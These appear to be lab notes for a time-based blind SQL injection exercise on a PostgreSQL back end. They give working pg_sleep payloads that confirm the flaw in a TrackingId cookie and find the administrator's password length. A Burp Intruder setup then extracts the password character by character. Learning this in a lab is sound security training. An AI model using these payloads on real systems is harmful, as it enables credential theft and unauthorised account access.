# Blind SQL Injection with Time Delays

Target Identification
* Action: Identify the injection point by checking parameters or cookies (e.g., TrackingId)
* Validation: Modify the value inside of TrackingId to =x' || pg_sleep(10) --. If the response takes exactly 10 seconds, the database is vulnerable

Target & Data Validation
* Username Verification: Inject into TrackingId =x'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) -- , a 5 seconds delay, confirm the 'administrator' user exists inside de 'users' table.

Password Length Discovery
* Logic: Once we know the user, we are going to guess the lenght of the password by using  Use AND LENGTH(password)>19 , just after the 'administrator' inside the payload. If the delay persists, the password is longer than 19 characters.

Data Extraction (Automated)
* Tool: Burp Intruder.
* Attack Type: Cluster Bomb.
* Payload: x'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)-- . We are adding the § manualy in the payload menu .
* Configuration
*   **Payload 1**: Numbers (1 to 20).
*   **Payload 2**: Simple List (a-z, 0-9).
*   **Resource Pool**: Set Maximum concurrent requests = 1 (Crucial for time-based accuracy)
* Analysis: Look for responses $\ge$ 3000ms. Assemble the characters based on their position. Login with the credentials and password found inside the Intruder . 
